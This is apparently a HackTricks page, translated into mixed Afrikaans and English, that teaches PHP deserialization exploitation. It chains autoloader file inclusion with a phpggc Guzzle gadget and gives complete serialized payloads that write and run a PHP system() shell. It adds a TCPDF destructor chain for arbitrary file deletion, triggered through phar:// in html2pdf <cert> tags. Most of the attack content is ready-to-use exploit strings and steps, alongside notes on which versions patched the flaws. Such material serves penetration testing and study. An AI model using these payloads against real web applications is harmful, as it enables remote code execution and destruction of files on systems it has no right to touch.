# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Eerstens moet jy kyk wat [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php) is.

## PHP deserialization + spl_autoload_register + LFI/Gadget

Ons is in 'n situasie waar ons 'n **PHP deserialization in 'n webapp** gevind het met **geen** biblioteek kwesbaar aan gadgets in **`phpggc`** nie. In dieselfde container was daar egter 'n **ander composer webapp met kwesbare biblioteke**. Die doel was dus om die **composer loader van die ander webapp te laad** en dit te misbruik om **'n gadget te laai wat daardie biblioteek sal uitbuit** met 'n gadget vanaf die webapp wat vir deserialization kwesbaar is.

Stappe:

- Jy het 'n **deserialization** gevind en daar **is geen gadget** in die huidige app-kode nie
- Jy kan 'n **`spl_autoload_register`** funksie misbruik soos die volgende om **enige plaaslike lêer met `.php` extension** te laad
- Hiervoor gebruik jy 'n deserialization waar die naam van die klas binne **`$name`** gaan wees. Jy **kan nie "/" of "." gebruik** in 'n klasnaam in 'n serialized object nie, maar die **code** is **replacing** die **underscores** ("\_") **for slashes** ("/"). Dus 'n klasnaam soos `tmp_passwd` sal in `/tmp/passwd.php` omgeskakel word en die code sal probeer om dit te laad.\
'n **gadget example** sal wees: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> As jy 'n **file upload** het en 'n lêer met **`.php extension`** kan oplaai, kan jy hierdie funksionaliteit **direk misbruik** en reeds RCE kry.

In my case, I didn’t have anything like that, maar daar was binne die **same container** nog 'n composer webblad met 'n **library vulnerable to a `phpggc` gadget**.

- Om hierdie ander library te laai, moet jy eers die **composer loader of that other web app** laai (want die een van die huidige toepassing sal nie toegang tot die libraries van die ander hê nie). **Knowing the path of the application**, kan jy dit baie maklik bereik met: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)
- Nou kan jy die ander **app composer loader load**, so dit is tyd om die **`generate the phpgcc`** **payload** te genereer om te gebruik. In my case, I used **`Guzzle/FW1`**, which allowed me to **write any file inside the filesystem**.
- NOTE: Die **generated gadget was not working**; sodat dit sou werk het ek daardie payload **`chain.php`** van phpggc **modified** en alle **attribute**s van die klasse **from private to public** gestel. Indien nie, na deserializing the string, het die attributes van die geskepte objects geen waardes gehad nie.
- Nou het ons die manier om die ander **app composer loader** te laai en 'n **phpggc payload that works**, maar ons moet dit in die **SAME REQUEST** doen sodat die loader gelaai is wanneer die gadget gebruik word. Hiervoor het ek 'n geserialiseerde array gestuur met albei objects soos:
- Jy kan sien **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Nou kan ons **'n lêer skep en daarin skryf**, maar die gebruiker **kon nie in enige gids binne die web server skryf nie**. Soos jy in die payload kan sien, word PHP wat **`system`** met 'n **base64** aanroep, geskep in **`/tmp/a.php`**. Dan kan ons **hergebruik die eerste tipe payload** wat ons as LFI gebruik het om die composer loader van die ander webapp te laai om die gegenereerde **`/tmp/a.php`** lêer te laai. Voeg dit net by die deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**Opsomming van die payload**

- **Load the composer autoload** of a different webapp in the same container
- **Load a phpggc gadget** to abuse a library from the other webapp (die aanvanklike webapp wat aan deserialization vatbaar was, het geen gadget in sy libraries gehad nie)
- Die gadget sal **create a file with a PHP payload** in /tmp/a.php skep met kwaadaardige opdragte (die webapp user kan nie in enige gids van enige webapp skryf nie)
- Die finale deel van ons payload sal gebruik maak van **load the generated php file** wat opdragte sal uitvoer

Ek moes hierdie **call this deserialization twice**. In my testing, die eerste keer is die `/tmp/a.php` lêer geskep maar nie gelaai nie, en die tweede keer is dit korrek gelaai.

## TCPDF `__destruct` POP chain vir arbitraire lêerverwydering

Wanneer 'n werklike `TCPDF` instance deur garbage-collected verwyder word roep dit `_destroy(true)` op, iterereer oor `$this->imagekeys`, en `unlink()` alles wat soos 'n kaslêer onder `K_PATH_CACHE` lyk. As 'n toepassing `unserialize($user_data)` uitvoer terwyl die `TCPDF` class gelaai is (bv. dit verwag 'n array met 'n `html` sleutel), kan jy 'n geserialiseerde objek verskaf wat stel:

- `file_id` to any integer that is not present in `self::$cleaned_ids` (e.g. `-1`).
- `imagekeys` to paths that begin with `K_PATH_CACHE` or that can be made to look like it (e.g. `/tmp/../tmp/do_not_delete_this_file.txt` when `K_PATH_CACHE` is `/tmp/`).

Example payload hitting an unsafe `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Die lêer word verwyder sodra die objek uit scope val. TCPDF 6.9.3 het die kontrole verskerp om slegs paaie met die `__tcpdf_<file_id>_` voorvoegsel binne `K_PATH_CACHE` te verwyder en het `_unlink()` bekendgestel om non-`file://` skema's te blokkeer, so ouer `Producer` weergawes is ideale teikens.

### Triggering the gadget via `phar://` in html2pdf `<cert>` tags

`spipu/html2pdf` (≤5.3.0) sit TCPDF in en stel 'n pasgemaakte `<cert>` blokkie bloot waarvan die `src`/`privkey` attributte geverifieer word met eenvoudige `file_exists()`. Op PHP < 8.0 veroorsaak enige filesystem-funksie wat 'n `phar://` URL raak dat die Phar metadata ge-unserialize word. Deur die kwaadwillige TCPDF-objek hierbo binne 'n Phar-argief te stoor, kry jy 'n betroubare POP selfs al roep die toepassing nooit self `unserialize()` aan nie.

1. Skep 'n Phar met `phar.readonly=0`, stel die stub/manifest om soos 'n beeld te lyk (bv. hernoem `archive.phar` na `archive.png`), en stoor die geserialiseerde TCPDF-objek in die Phar se metadata.
2. Laai/plaas die lêer iewers bereikbaar, bv. `/tmp/user_files/user_1/archive.png`.
3. Dien HTML in wat die `<cert>` tag bevat sodat html2pdf die aanvallersbeheerde pad oplos:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Die oproep na `file_exists()` deserializes die metadata, instantiates TCPDF, en sy destructor verwyder die gekose lêer, wat html2pdf in 'n kragtige `phar://` entry point omskep. Weergawe 5.3.1 het `Security::checkValidPath()` bygevoeg om nie-goedgekeurde skemas te blokkeer, so ouer implementasies steeds aantreklik bly.

## Verwysings

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
